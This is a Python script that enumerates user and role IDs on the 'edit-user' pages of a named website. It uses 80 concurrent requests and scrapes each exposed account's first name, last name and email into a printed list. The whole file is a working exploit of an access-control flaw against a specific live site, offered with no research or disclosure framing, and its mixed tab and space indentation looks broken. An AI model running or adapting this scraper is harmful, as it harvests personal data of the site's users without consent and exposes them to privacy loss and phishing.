import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bs4

r = requests.Session()
baseUrl = "https://riden.com.np/common/edit-info/edit-user"

all_users = [f"{baseUrl}/{user}/{role}" for user in range(1,51) for role in range(1,15)]

usr_list=[]

def req(user):
	return r.get(user)

def getParameter(id):
	return str(bs4(str(res.text), 'html.parser').find(id=id)).split("value=\"")[1].split("\"")[0]

with ThreadPoolExecutor(max_workers=80) as e:
	results = e.map(req, all_users)
	for res in results:
    	if(res.status_code == 200):
        	first_name = getParameter("first_name")
        	last_name = getParameter("last_name")
        	email = getParameter("email")
        	usr = {
            	"First_Name" : first_name,
            	"Last_Name" : last_name,
            	"Email" : email
        	}
        	if(usr not in usr_list):
            	usr_list.append(usr)
            	print(usr)


